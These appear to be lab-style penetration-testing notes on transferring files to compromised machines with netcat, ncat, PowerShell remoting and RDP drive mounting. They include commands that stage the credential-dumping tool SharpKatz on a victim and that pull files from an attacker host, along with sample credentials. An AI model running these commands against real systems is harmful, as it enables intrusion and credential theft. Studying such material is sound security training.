# File Transfers Using Netcat and Ncat

## NetCat: Compromised Machine - Listening on Port 8000
```bash
nc -lp 8000 > SharpKatz.exe
```

If the comporomised machine is using Ncat, we'll need to specify `--recv-only` 
to close the connection once the file transfer is finished.

## Ncat -Compromised Machine - Listening on Port 8000
```bash
target: ncat -lp 8000 --recv-only > SharpKatz.exe
```

## Netcat -Attack Host - Sending File to Comporomised Machine
```bash
home: 
	wget -q https://github.com/somerandomuser/somerandombullshit.exe
	nc -q 0 192.168.111.124 8000 < somerandombullshit.exe
```

## Ncat - Attack Host - Sending Files to Compromised Machine
```bash
home:
	ncat --send-only 192.168.111.124 8000 < somerandombullshit.exe

or from the victim machine:
	nc 10.10.14.154 443 > somerandombullshit.exe
```
## Using PowerShell

```bash
PS:

whoami
htb\administrator

hostname
DC01

Test-NetConnection -ComputerName DATABASE01 -Port 5985

	ComputerName:	DATABASE01
	RemoteAddress:	192.168.69.420
	RemotePort:		5985
	InterfaceAlias:	Ethernet0
	SourceAddress:	192.168.1.100
	TcpTestSucceeded:	True

$session = New-PSsession -ComputerName DATABASE01

Copy-Item -Path C:\samplefile.txt -ToSession $session 
	-Destination C:\Users\Administrator\Desktop\samplefile.txt

to download FROM remote:

Copy-Item -Path C:\Users\Administrator\Desktop\samplefile.txt 
	-Destination C:\ -FromSession $session
```

## Mounting a Linux Folder Using rdesktop

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password123!' 
	-r disk:linux='/home/user/share/files'
```

## Mounting a Linux Folder Using xfreerdp

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password123!' \
	/drive:linux,/home/user/share/files
```

To access the directory, we can connect to `\\tsclient\`, 
allowing us to transfer files to and from the RDP session. 

Alternatively, from Windows we can use the native `mstsc.exe` remote desktop client.

